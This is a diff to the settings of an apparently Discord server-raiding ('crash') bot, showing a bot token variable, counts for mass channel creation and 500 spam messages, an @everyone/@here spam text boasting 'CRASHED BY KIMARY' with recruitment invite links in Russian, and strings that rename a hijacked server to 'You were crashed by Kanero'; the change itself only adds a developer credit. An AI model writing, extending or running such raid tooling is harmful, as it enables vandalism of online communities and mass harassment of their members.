@@ -2,7 +2,7 @@ import os
 TOKEN = os.environ.get("DISCORD_TOKEN", "")
 CHANNELS_COUNT = 30
 SPAM_COUNT = 500
-SPAM_TEXT = "|| @everyone  @here ||\n# CRASHED BY KIMARY AND INTARAKTIVE SQUAD\n# Удачи гайс)\nhttps://discord.gg/Pmt838emgv\nХочешь так же? Заходи к нам!\n☠️ Kanero — https://discord.gg/exYwg6Gz"
+SPAM_TEXT = "|| @everyone  @here ||\n# CRASHED BY KIMARY AND DAVAIDKA CLNX INTARAKTIVE SQUAD\n# Удачи гайс)\nhttps://discord.gg/Pmt838emgv\nХочешь так же? Заходи к нам!\n☠️ Kanero — https://discord.gg/exYwg6Gz\nDeveloper - DavaidKa ❤️"
 GUILD_NAME = "Kanero"
 GUILD_DESCRIPTION = "Вы были крашнуты By Kanero"
 RENAME_TEXT = "Вы были крашнуты By Kanero"
